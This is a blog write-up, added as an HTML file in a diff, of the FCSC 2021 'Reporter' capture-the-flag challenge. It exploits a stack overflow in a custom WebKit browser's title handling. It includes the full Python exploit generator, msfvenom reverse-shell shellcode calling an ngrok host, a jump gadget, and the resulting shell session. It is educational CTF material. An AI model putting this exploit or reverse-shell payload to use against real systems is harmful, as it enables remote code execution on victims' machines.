@@ -1,0 +1,348 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title> FCSC 2021 - Reporter - Slowerzs&#39; blog </title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="referrer" content="no-referrer">
+    <meta name="description" content="" />
+    <meta property="og:site_name" content="Slowerzs&#39; blog" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://slowerzs.github.io/post/fcsc-reporter/" />
+    <meta property="og:title" content="FCSC 2021 - Reporter" />
+    <meta property="og:image" content="https://slowerzs.github.io/" />
+    <meta property="og:description" content="" />
+
+    <meta name="twitter:card" content="summary_large_image" />
+    
+    <meta name="twitter:title" content="FCSC 2021 - Reporter" />
+    <meta name="twitter:description" content="" />
+    <meta name="twitter:image" content="https://slowerzs.github.io/" />
+
+    <link rel="canonical" href="https://slowerzs.github.io/post/fcsc-reporter/">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha512-MoRNloxbStBcD8z3M/2BmnT+rg4IsMxPkXaGh2zD6LGNNFE80W3onsAhRcMAMrSoyWL9xD7Ert0men7vR8LUZg==" crossorigin="anonymous" />
+
+    <link rel="stylesheet" href="https://slowerzs.github.io/css/custom.css" />
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/styles/github-gist.min.css" integrity="sha512-od7JLoOTxM8w/HSKGzP9Kexc20K9p/M2zxSWsd7H1e4Ctf+8SQFtCWEZnW5u6ul5ehSECa5QmOk9ju2nQMmlVA==" crossorigin="anonymous" />
+    
+
+    
+
+    <link rel="shortcut icon"
+        href="https://slowerzs.github.io/images/favicon.png">
+
+    
+    <link href="https://slowerzs.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Slowerzs&#39; blog" />
+    
+</head>
+
+<body>
+    
+    <div class="mt-xl header">
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-auto">
+                <a href="https://slowerzs.github.io/">
+                    <h1 class="name">Slowerzs&#39; blog</h1>
+                </a>
+            </div>
+        </div>
+
+        <div class="row justify-content-center">
+            <ul class="nav nav-primary">
+                
+                <li class="nav-item">
+                    <a class="nav-link" href="https://slowerzs.github.io/">
+                        
+                        Home
+                    </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a class="nav-link" href="https://slowerzs.github.io/about/">
+                        
+                        About
+                    </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a class="nav-link" href="https://github.com/Slowerzs">
+                        
+                        GitHub
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+
+    <div class="content">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-sm-12 col-lg-8">
+                    <h1 class="mx-0 mx-md-4">FCSC 2021 - Reporter</h1>
+                    <div class="markdown">
+                        
+    <h2 id="reporter">Reporter</h2>
+<blockquote>
+<p>Vous arrivez dans une nouvelle entreprise qui utilise un navigateur conçu en interne. Pouvez-vous obtenir un shell sur la machine de la personne qui vérifie les liens qu&rsquo;on lui envoie ?</p>
+</blockquote>
+<blockquote>
+<p><a href="http://challenges2.france-cybersecurity-challenge.fr:4009/">http://challenges2.france-cybersecurity-challenge.fr:4009/</a></p>
+</blockquote>
+<p>For this challenge, we are given a binary, named <code>fcsc_browser</code>, and a link, where we can submit urls. With the description of the challenge and the category, we expect this challenge to be a browser exploitation challenge : the goal is to craft a malicious website, that upon visit with the <code>fcsc_browser</code>, will trigger arbitrary commands and execute a reverse shell, allowing us to gain access to the machine of the bot visiting the links.</p>
+<h2 id="discovery">Discovery</h2>
+<p>We start checking checking out the provided binary. There is no source provided, so I do not expect this to be a modern browser such as Chromium based or similar, but more something custom-made.</p>
+<p>Let&rsquo;s open up the browser and see what it is !</p>
+
+
+
+
+
+
+    
+
+
+<img class="centered" src='https://slowerzs.github.io/images/browser_hud02869bd80af7d2d129fa7d42db245b8_297667_800x800_fit_box_2.png' alt='Browser landing page'>
+
+<p>By playing with it, it behaves like any web browser, we can use the url bar to visit any website.
+To get an idea of what technologies are used in this browser, I open it up in a decompiler and look for interesting classes. I will use Ghidra.</p>
+
+
+
+
+
+
+    
+
+
+<img class="centered" src='https://slowerzs.github.io/images/classes_hu2263cf8bee60d7ebfa6f3587ab377818_114353_900x600_fit_box_2.png' alt='List of classes'>
+
+<p>There are many classes used, but we can easily figure out that this browser uses <code>WebKitWebView</code>, a technology that relies on the GTK graphical library.</p>
+<h2 id="searching-for-vulnerabilities">Searching for vulnerabilities</h2>
+<p>There are many functions defined throughout the program, so we need a starting point. Going back to the browser, I noticed two things : one, the title of a tab is a reflection of the content defined in <code>&lt;title&gt;</code> in the html of the page (&ldquo;Agence nationnale&rdquo; in the example above), and second, the title of the window is updated any time we visit a different url. I decided to start by checking out the implementation of these to functionnalities - as good a place to start as any.</p>
+<p>Going back to Ghidra, I find out that the class <code>Browser</code> implements most of the functionnality of the browser. There is one related function, <code>addBrowser</code>.</p>
+
+
+
+
+
+
+    
+
+
+<img class="centered" src='https://slowerzs.github.io/images/ghidra_hu9a8e0316ede2b6a2c3a09ef4a52300ed_462926_1200x1000_fit_box_2.png' alt=''>
+
+<p>Checking out cross-references, I find that <code>addBrowser</code> is called by a function called <code>webview_title_change</code>. That seems promising.</p>
+<p>The decompilation is not perfect, but by looking at the assembly we quickly figure out what this function does : it allocates a stack buffer of size 0x80, zeroes it out, calculates the length of a global variable <code>app_name</code>, adds it to the stack buffer, concatenates the string &quot; - &quot; to the stack buffer, and finally concatenates the string passed as an argument. Given that this function is called by <code>webview_title_change</code>, I hypothesize this argument is the title.</p>
+<p>Let&rsquo;s check if this assumption is correct using a debugger. I will use <code>gdb</code>, with the <code>gef</code> python script.
+To do this, I set up a breakpoint at the 3rd <code>memcpy</code> and launch the browser. It is hit before the page is rendered.</p>
+<pre><code>memcpy@plt (                                                                                                                            
+   $rdi = 0x00007fffffffd33f -&gt; 0x0000000000000000,                        
+   $rsi = 0x00000000007cb3a0 -&gt; 0x6e2065636e656741,    
+   $rdx = 0x000000000000003a       
+)                                                                                                              
+.... 
+gef&gt;  x/s $rsi
+0x7cb3a0:       &quot;Agence nationale de la s\351curit\351 des syst\350mes d'information&quot;
+gef&gt;  x/s $rdi-15
+0x7fffffffd330: &quot;FCSC Browser - &quot;
+</code></pre><p>Our assumption was correct : we concatenate the title in the <code>&lt;title&gt;</code> in the stack buffer. We also know that the <code>app_name</code> is <code>FCSC Browser</code> at runtime.</p>
+<p>Looking back at the <code>addBrowser</code> function, I don&rsquo;t see any size check on the title. Could this lead to a stack overflow ? There might be preconditions or checks before the call to <code>addBrowser</code>, but it is worth a try.</p>
+<p>First, let&rsquo;s find out what protection are enabled on this binary to know what to expect - if there is a stack canary or not.</p>
+<pre><code>$ checksec fcsc_browser
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</code></pre><p>There isn&rsquo;t any protection ! That&rsquo;s good news for us.</p>
+<p>Let&rsquo;s quickly check out our idea.
+For this, I wrote a simple python script</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
+
+buf = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a&#39;</span>*200
+
+payload = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&lt;html&gt;&lt;title&gt;&#34;</span>
+payload += buf
+payload += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&lt;/title&gt;&lt;/html&gt;&#34;</span>
+
+<span style="color:#00f">with</span> open(<span style="color:#a31515">&#34;exploit.html&#34;</span>, <span style="color:#a31515">&#34;wb&#34;</span>) <span style="color:#00f">as</span> f:
+	f.write(payload)
+
+</code></pre></div><p>I set up a local webserver using <code>python3 -m http.server 1234</code> and navigate using <code>fcsc_browser</code> to <code>http://localhost:1234/exploit.html</code></p>
+<p>We get a crash !</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>In <code>gdb</code>, this is the ouput we get from the crash :</p>
+<pre><code>[!] Cannot disassemble from $PC
+
+[#0] Id 1, Name: &quot;fcsc_browser&quot;, stopped 0x407f82 in addBrowser(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;) (), reason: SIGSEGV
+[#1] Id 2, Name: &quot;BMScavenger&quot;, stopped 0x7ffff1b387b2 in futex_wait_cancelable (), reason: SIGSEGV
+[#2] Id 3, Name: &quot;PressureMonitor&quot;, stopped 0x7ffff1b38ad8 in futex_abstimed_wait_cancelable (), reason: SIGSEGV
+[#3] Id 4, Name: &quot;HashSaltStorage&quot;, stopped 0x7ffff1a573ff in __GI___poll (), reason: SIGSEGV
+[#4] Id 5, Name: &quot;ebsiteDataStore&quot;, stopped 0x7ffff1a573ff in __GI___poll (), reason: SIGSEGV
+[#5] Id 6, Name: &quot;gmain&quot;, stopped 0x7ffff1a573ff in __GI___poll (), reason: SIGSEGV
+[#6] Id 7, Name: &quot;gdbus&quot;, stopped 0x7ffff1a573ff in __GI___poll (), reason: SIGSEGV
+[#7] Id 10, Name: &quot;ReceiveQueue&quot;, stopped 0x7ffff1a573ff in __GI___poll (), reason: SIGSEGV
+[#8] Id 11, Name: &quot;ReceiveQueue&quot;, stopped 0x7ffff1a573ff in __GI___poll (), reason: SIGSEGV
+
+[#0] 0x407f82 -&gt; addBrowser(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;)()
+
+</code></pre><p>We crashed in the <code>addBrowser</code> function, just like we hoped ! The reason for this crash is because we overwrote the return of the function with <code>0x6161616161616161</code>, so it crashes when it tries to return. Perfect for us!
+The next step is to find how many bytes are needed to overwrite this return address. I used <code>gef</code> useful tools for this, with <code>pattern create 200</code> we generate a cyclic pattern that we can easily spot. Then, I replace the <code>a</code> in <code>exploit.html</code> by the string return by <code>gef</code>, and visit the page again.</p>
+<p>After the crash, using <code>pattern offset $rsp</code>, we easily find out we can write 137 bytes before starting to overwrite the return address.</p>
+<p>Let&rsquo;s move on to exploitation. The first idea that comes to mind, because <code>NX</code> is not enabled, is to write a shellcode in our buffer, then jump to it. However, I assume <code>ASLR</code> is enabled on the remote machine, so I don&rsquo;t really have a way to predict at what address the shellcode will end up. Next, we think of the heap : because this is a web browser, I expect the string to be allocated on the heap (we can see on the first <code>gdb</code> breakpoint above that the <code>rsi</code> register contains a heap address, at which is stored our string).
+Again, because <code>NX</code> is not enabled, we could jump to our shellcode in the heap, however, because this is a web browser, many allocations occur on the heap, thus it is difficult to predict in what state the heap will be when the bot ends up on our page.</p>
+<p>So the next logical idea is to build a ropchain to get a reverse shell. However, after a few tries, I quickly realized something : if we modify the python script to have</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a&#39;</span>*137 + p64(0)
+</code></pre></div><p>and break at the return of the <code>addBrowser</code> function, our return address is not <code>0x0000000000000000</code>, it is completely scrambled. The reason for this is because in the <code>addBrowser</code> function, it calculates the length of the string before <code>memcpy</code>&lsquo;ing it to the stack buffer, so it stops after a null byte. So we can&rsquo;t write the full address of our gadgets in the ropchain.</p>
+<p>Luckily for us, if we change our <code>buf</code> to be</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a&#39;</span>*137 + <span style="color:#a31515">b</span><span style="color:#a31515">&#39;A&#39;</span>*4
+</code></pre></div><p>at the end of the <code>addBrowser</code> function, our return address is <code>0x0000000041414141</code>. Therefore, we can partially overwrite this return address to point to any gadget we want. However, that means we can only use one gadget, because we can&rsquo;t write anything afterwards.</p>
+<p>How do we exploit this ? Let&rsquo;s check out our registers at the end of <code>addBrowser</code> when overwriting the return address.</p>
+<pre><code>gef&gt;  registers 
+$rax   : 0x00007fffffffd3f0  -&gt;  0x0000000000acaa30  -&gt;  &quot;FCSC Browser - aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]&quot;
+$rbx   : 0x6161616161616161 (&quot;aaaaaaaa&quot;?)
+$rcx   : 0x1b              
+$rdx   : 0xc0              
+$rsp   : 0x00007fffffffd3c8  -&gt;  0x6161616161616161 (&quot;aaaaaaaa&quot;?)
+$rbp   : 0x6161616161616161 (&quot;aaaaaaaa&quot;?)
+$rsi   : 0x00007fffffffd330  -&gt;  &quot;FCSC Browser - aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]&quot;
+$rdi   : 0x0000000000acaa30  -&gt;  &quot;FCSC Browser - aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]&quot;
+$rip   : 0x0000000000407f82  -&gt;  &lt;addBrowser(std::__cxx11::basic_string&lt;char,+0&gt; ret 
+$r8    : 0x0000000000acaa30  -&gt;  &quot;FCSC Browser - aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]&quot;
+$r9    : 0x0               
+$r10   : 0x00007fffffffd898  -&gt;  0x000000000067e470  -&gt;  0x00000000006a4fb0  -&gt;  0x000000000061b460  -&gt;  0x000000000000007c (&quot;|&quot;?)
+$r11   : 0x10              
+$r12   : 0x6161616161616161 (&quot;aaaaaaaa&quot;?)
+$r13   : 0x00007fffffffd690  -&gt;  0x0000000000812510  -&gt;  0x0000000000000002
+$r14   : 0x00007fffffffd610  -&gt;  0x000004c500000001
+$r15   : 0x0000000000a35170  -&gt;  0x0000000040000002
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+</code></pre><p>The first thing that jumps out is that if we found a <code>jmp rsp</code> gadget, we could jump to our shellcode, however as we just saw we cannot write anything after the address of our gadget, so we cannot use this idea.
+Next, we notice that <code>rsi</code>, <code>rdi</code> and <code>r8</code> all have addresses where our string is allocated, either on the stack or in the heap, which are executable.
+If we found a gadget that lets us jump to any of these, we could execute a shellcode, however, there is a slight problem : before our shellcode, there is <code>FCSC Browser - </code>, and if we check out what it translates to if executed, there are invalid instruction.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt;<span style="color:#00f">print</span>(disasm(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;FCSC Browser - &#39;</span>, arch=<span style="color:#a31515">&#34;amd64&#34;</span>))
+0:   46                      rex.RX
+1:   43 53                   rex.XB push r11
+3:   43 20 42 72             rex.XB <span style="color:#00f">and</span> BYTE PTR [r10+0x72], al
+7:   6f                      outs   dx, DWORD PTR ds:[rsi]
+8:   77 73                   ja     0x7d
+a:   65 72 20                gs jb  0x2d
+d:   2d                      .byte 0x2d
+e:   20                      .byte 0x20
+</code></pre></div><p>For this to work, we would need a gadget that adds at least 15 to one those registers, then jumps to it. I did find a <code>call rdi</code> and a <code>jmp rcx</code>, but they were not preceded by any addition that suits us.</p>
+<p>What about <code>rax</code> ? It is a pointer to the address of our string, for this to work, we would need a slightly different gadget : add at least 15 to the valued pointed by <code>rax</code>, then jump to the value pointed by <code>rax</code>.</p>
+<p>Using <code>ROPgadget</code> I did find one that matched (remember that <code>rcx</code> has a value of <code>0x1b</code>)</p>
+<pre><code>$ ROPgadget --binary fcsc_browser | grep 'jmp qword ptr \[rax'
+...
+0x0000000000403d77 : add byte ptr [rax], cl ; jmp qword ptr [rax]
+...
+</code></pre><p>Perfect ! However, <code>cl</code> has a value of <code>0x1b</code>, that is a little over 15, so the first few bytes will be ignored, but that is fine.</p>
+<p>We just have to write a shellcode now, and we should be able to get a shell</p>
+<h2 id="the-shellcode">The shellcode</h2>
+<p>Our shellcode should be a reverse shell, because we have no other way to communicate with the bot. We have one restriction : no null byte. To be efficient, I use <code>metasploit</code> shellcode generator, <code>msfvenom</code>, which has a handy option of bytes we want to exclude.</p>
+<p>We will need a public address, for this I used <code>ngrok</code>, using <code>ngrok tcp 1234</code></p>
+<p>We can generate such payload using <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=2.tcp.ngrok.io LPORT=15636 -b '\x00' -f py</code></p>
+<p>The output is 119 bytes long, that can fit in our <code>137 - (0x1e - 15) = 122</code> bytes space.</p>
+<p>We modify our python script :</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf =  <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;</span>
+buf += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05</span><span style="color:#a31515">&#34;</span>
+buf += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\xef\xff\xff\xff\x48\xbb\x81\x80\xcc\xaa\x59\x82\x18</span><span style="color:#a31515">&#34;</span>
+buf += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\x8e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span style="color:#a31515">&#34;</span>
+buf += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\xeb\xa9\x94\x33\x33\x80\x47\xe4\x80\xde\xc3\xaf\x11</span><span style="color:#a31515">&#34;</span>
+buf += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\x15\x50\x37\x83\x80\xf5\x17\x5a\x8c\xae\x45\xd0\xc8</span><span style="color:#a31515">&#34;</span>
+buf += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\x45\x4c\x33\x92\x42\xe4\xab\xd8\xc3\xaf\x33\x81\x46</span><span style="color:#a31515">&#34;</span>
+buf += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\xc6\x7e\x4e\xa6\x8b\x01\x8d\x1d\xfb\x77\xea\xf7\xf2</span><span style="color:#a31515">&#34;</span>
+buf += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\xc0\xca\xa3\xa1\xe3\xe9\xa2\x85\x2a\xea\x18\xdd\xc9</span><span style="color:#a31515">&#34;</span>
+buf += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\x09\x2b\xf8\x0e\xca\x91\x68\x8e\x85\xcc\xaa\x59\x82</span><span style="color:#a31515">&#34;</span>
+buf += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\x18\x8e</span><span style="color:#a31515">&#34;</span>
+buf = buf.rjust(137, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x90</span><span style="color:#a31515">&#39;</span>) <span style="color:#008000"># We pad the shellcode with nops</span>
+
+
+payload = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&lt;html&gt;&lt;title&gt;&#34;</span>
+payload += buf
+payload += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\x77\x3d\x40</span><span style="color:#a31515">&#34;</span> <span style="color:#008000"># 0x403d77 is the address of our gadget</span>
+payload += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&lt;/title&gt;&lt;/html&gt;&#34;</span>
+
+<span style="color:#00f">with</span> open(<span style="color:#a31515">&#34;exploit.html&#34;</span>, <span style="color:#a31515">&#34;wb&#34;</span>) <span style="color:#00f">as</span> f:
+        f.write(payload)
+</code></pre></div><p>This nearly works, expected for one detail : if we debug the program, we jump to our shellcode, but it is not exactly the same. I did not spend too much time figuring out why, I noticed some bytes were modified and other were not, but my educated guess would be after hovering over the code, that the title is utf-8 decoded, which transforms the shellcode.
+It took me some time to find out exactly which bytes were modified, but I ended genrating my shellcode with <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=2.tcp.ngrok.io LPORT=15636 -b '\x00\x80\x83\x84\x85\x86\x87\x8b\x82\x89\x99\x91\x92\x93\x94\x95\x96\x9b\x97\x98\x9a\x9c\x9e\x9f\x8a\x8e\x0d\x0a\x0c\x8c\x09\x88' -f py</code></p>
+<p>I replaced the <code>buf</code> in the above python script by the new output, and this time, it worked ! I set up a webserver, gave a link to <code>exploit.html</code> to the bot and after a few seconds, we get a shell !</p>
+<pre><code class="language-raw" data-lang="raw">$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 57666
+id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+ls -al
+total 140
+drwxr-xr-x 1 root  root    4096 Apr 21 13:48 .
+drwxr-xr-x 1 root  root    4096 Apr 23 12:46 ..
+-rwxr-xr-x 1 admin admin 112984 Apr 21 13:46 fcsc_browser
+-rw-r--r-- 1 admin admin     71 Apr 21 13:45 flag
+-rw-r----- 1 admin admin    915 Apr 21 13:45 main.py
+-rwxr-xr-x 1 admin admin    227 Apr 21 13:45 run.sh
+drwxr-x--x 1 admin admin   4096 Apr 21 13:48 static
+drwxr-x--x 1 admin admin   4096 Apr 21 13:48 templates
+</code></pre><p>And the flag : <code>FCSC{da8089fd6e7a40288a64f88b6a1a8027457206dffbfb28a5c8489a4e1c866e08}</code></p>
+<h1 id="conclusion">Conclusion</h1>
+<p>This browser exploit challenge was fun, and not as difficult as I expected it to be, I enjoyed the challenge :)</p>
+
+
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <section id="comments">
+    <div class="py-3 content">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-sm-12 col-lg-8">
+                    <div class="comments">
+                        <script src="https://utteranc.es/client.js" repo=""
+                            issue-term="pathname" label="comment" theme="github-light" crossorigin="anonymous" async>
+                            </script>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+    
+
+
+    
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/highlight.min.js" integrity="sha512-TDKKr+IvoqZnPzc3l35hdjpHD0m+b2EC2SrLEgKDRWpxf2rFCxemkgvJ5kfU48ip+Y+m2XVKyOCD85ybtlZDmw==" crossorigin="anonymous"></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/python.min.js" defer></script>
+        
+        <script>
+            window.addEventListener('load', function() {
+                hljs.initHighlighting();
+            }, true);
+        </script>
+    
+
+    
+
+    
+    
+</body>
+
+</html>
